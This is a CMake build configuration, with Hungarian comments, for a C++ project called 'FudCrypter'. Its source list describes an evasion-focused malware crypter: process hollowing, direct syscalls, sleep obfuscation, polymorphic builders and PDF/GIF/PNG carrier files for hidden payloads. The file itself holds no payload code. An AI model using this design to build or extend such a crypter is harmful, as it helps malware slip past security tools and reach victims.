cmake_minimum_required(VERSION 3.16)
project(FudCrypter VERSION 1.0.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

if(NOT CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Release)
endif()

# ------------------------------------------------------------------
# PLATFORM DETEKTÁLÁS
# ------------------------------------------------------------------
if(WIN32)
    set(FUD_PLATFORM "windows")
    add_definitions(-DFUD_PLATFORM_WINDOWS)
    set(PLATFORM_SRCS
        src/platform/windows.cpp
    )
    set(WIN_EXTRA_SRCS
        src/api_resolver.cpp
        src/syscall.cpp
        src/sleep_obf.cpp
        src/hollowing.cpp
        src/syscall.asm
    )
    # TELJES STATIKUS LINKELÉS – minden MinGW DLL-t beépít
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
elseif(UNIX)
    set(FUD_PLATFORM "linux")
    add_definitions(-DFUD_PLATFORM_LINUX)
    set(PLATFORM_SRCS
        src/platform/linux.cpp
    )
    set(WIN_EXTRA_SRCS "")
endif()

# ------------------------------------------------------------------
# INCLUDE KÖNYVTÁRAK
# ------------------------------------------------------------------
include_directories(${CMAKE_CURRENT_SOURCE_DIR}/include)

# ------------------------------------------------------------------
# CORE KÖNYVTÁR (statikus)
# ------------------------------------------------------------------
add_library(fud_crypter_core STATIC
    src/builder/builder.cpp
    src/builder/pdf_builder.cpp
    src/builder/gif_builder.cpp
    src/builder/png_builder.cpp
    src/builder/polymorph.cpp
    src/carrier/factory.cpp
    src/carrier/pdf_carrier.cpp
    src/carrier/gif_carrier.cpp
    src/carrier/png_carrier.cpp
    src/crypto/xor_crypto.cpp
    src/crypto/factory.cpp
    src/loader/loader.cpp
    src/memory/executable_memory.cpp
    ${PLATFORM_SRCS}
    ${WIN_EXTRA_SRCS}
)

target_include_directories(fud_crypter_core PUBLIC
    $<BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include>
)

# ------------------------------------------------------------------
# ASSEMBLY FORDÍTÁS (csak Windows, NASM szükséges)
# ------------------------------------------------------------------
if(WIN32)
    enable_language(ASM_NASM)
    find_program(NASM_EXECUTABLE nasm)
    if(NASM_EXECUTABLE)
        set_source_files_properties(src/syscall.asm PROPERTIES
            LANGUAGE ASM_NASM
            COMPILE_FLAGS "-f win64"
        )
    else()
        message(WARNING "NASM not found – syscall.asm will not be compiled. Install NASM for Windows builds.")
    endif()
endif()

# ------------------------------------------------------------------
# PLATFORM-SPECIFIKUS LINKELÉS
# ------------------------------------------------------------------
if(WIN32)
    target_link_libraries(fud_crypter_core PUBLIC advapi32)
else()
    target_link_libraries(fud_crypter_core PUBLIC pthread)
endif()

# ------------------------------------------------------------------
# FŐ VÉGREHAJTÓ
# ------------------------------------------------------------------
add_executable(fud-crypter main.cpp)
target_link_libraries(fud-crypter PRIVATE fud_crypter_core)

# ------------------------------------------------------------------
# TESZTEK (opcionális)
# ------------------------------------------------------------------
option(BUILD_TESTS "Build unit tests" OFF)
if(BUILD_TESTS)
    enable_testing()
    add_subdirectory(tests)
endif()

# ------------------------------------------------------------------
# TELEPÍTÉS
# ------------------------------------------------------------------
install(TARGETS fud-crypter fud_crypter_core
    RUNTIME DESTINATION bin
    LIBRARY DESTINATION lib
    ARCHIVE DESTINATION lib
)
install(DIRECTORY include/ DESTINATION include)
